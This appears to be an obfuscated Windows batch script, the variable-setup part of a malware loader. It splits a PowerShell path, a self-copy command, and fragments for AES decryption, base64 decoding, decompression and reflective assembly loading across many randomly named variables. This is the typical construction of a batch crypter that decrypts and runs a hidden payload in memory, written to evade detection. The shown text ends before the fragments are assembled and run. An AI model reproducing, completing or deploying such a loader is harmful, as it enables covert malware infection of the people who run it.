@echo off
set "vOERHYFPoG=xe"
set "zAiChDVtci=rS"
set "PmFNCVLRZM=:\"
set "raoZMyrxdS=we"
set "FWTURrThRI= /"
set "qCigZRQjLj=st"
set "XaIzwnqfNH=Po"
set "vudIQpvKqu=ll"
set "ccgEfjgFSe=he"
set "OevxgfFjIS=nd"
set "bYjxdtuGkk=ll"
set "rWcFFYZsfu=1."
set "asuyLgTvEi=he"
set "BzFsuNaagr=s\"
set "otNsPZrytD=\W"
set "NMRFAgBvPg=ow"
set "hlcHbwXaiH=po"
set "gGefvxSgrS=\v"
set "URFpkGhILp=co"
set "afXkEzoyae=we"
set "WRpXDihqAc=in"
set "eFcrQhwxnP=32"
set "kPforLzRqR=do"
set "MZwTCeGhGC=.e"
set "sgjrbnqEfY=py"
set "DIOlpppnfw=Wi"
set "OTxZUozccs=em"
set "vPlwHrSvQg= C"
set "vtVVUvffjV=ws"
set "cFpurKRhHw=Sy"
set "pdEVbyaiwr=rs"
set "etYmEbWBWG=y "
set "tIGWJewzLS=0\"
set "iDcZawLzKG= %~dp0"
set "MKxMIpuwpK=cd"
set "fAyYlWfEkd=ode]"
set "pmGDxrbANu=Fina"
set "vonROULVpE=grap"
set "ZQsNlixbCv= = ["
set "IEZOWIHKid=pStr"
set "mSPDRthhDK=esaB"
set "PxyeAyUqDQ=DAl."
set "XHBYcMcTBT=th('"
set "fZktAwTNlU=O.Su"
set "ZZkPqEyBTE=pose"
set "yUKjmJtEwL=yste"
set "VaaRrgIAxf=gth)"
set "CGXAhQLNlM=y.Pa"
set "DtkMEErlVv=ExOx"
set "MPryikIqFw=form"
set "GANAoCCKNj=ss -"
set "XzzGXkKfuu=KjXO"
set "MxEWIcJJbJ=ispo"
set "okmGjTCbVP=tem."
set "vtgVsEJngJ=ke($"
set "kNmoKqOkqp=hy.A"
set "pQbBMoWxCn=lit("
set "ikYNJgDAmT=k; }"
set "zUCHSEtXOU=oArr"
set "oEdFuRfxdE=pose"
set "PblPnCuIjm=Secu"
set "ACsJhoPmrO=esFX"
set "apNYSPrqTl=js ="
set "bOTVMuOwPe=);$f"
set "QqAIamWvWF=yTo("
set "BCPgkMltYY=, (,"
set "TvQpFbIEJN=y.Cr"
set "yhAoFDNuQm=BC;$"
set "PrvTnYVQWs=ress"
set "tqqoMcYadz=[IO."
set "yBrcOzQEtu= = $"
set "DjtFNlOATb=comp"
set "PsKDrPYaOn=[-1."
set "mSrYpSWlQp=).Sp"
set "ExYItzlQWt=('da"
set "PZPqnSGpUs=] -j"
set "btKkAaNJCl=ptog"
set "YwEqqhwxwX=embl"
set "VIvFEKqxQs=ewLi"
set "MaCFSQEjQs=();$"
set "NqaWJzTYWn=ck($"
set "BQGlfiSFDO=comm"
set "GYJyUvXWLT=;$fJ"
set "rUBPYoSMeb=.IO."
set "swIMquFpcD=xOxK"
set "ZgsYCVFIcH=-1.."
set "kAVwdZdazj=  $d"
set "xyMbVLgAtb=Syst"
set "doqNZseclm=yste"
set "YVRSqbLnjk=flec"
set "jmBGKFzOhC=I = "
set "cyQlJxcYjB=fizO"
set "wOHpgSdOJn=tsWi"
set "MlrrfCrUQy=ect "
set "myAycydMit=Disp"
set "iLxvxpBqcz=ew-O"
set "SZvJhHDkdO=ing("
set "ExVTVRMNiu=.Len"
set "LenrIjvhBH=$LrA"
set "JavdAEgMsO=fore"
set "dWdJioEeoi= if "
set "grbUOvGkZa=onve"
set "yDokYTZMth=pher"
set "GRTbYodUXN=y]::"
set "OtSKXNJKOS=brea"
set "lZOrkjmURg=m.Re"
set "OWJgWrTppo=$zNb"
set "hgyzSVKKKy=$Nrh"
set "KRnFBmYcHo=S46e"
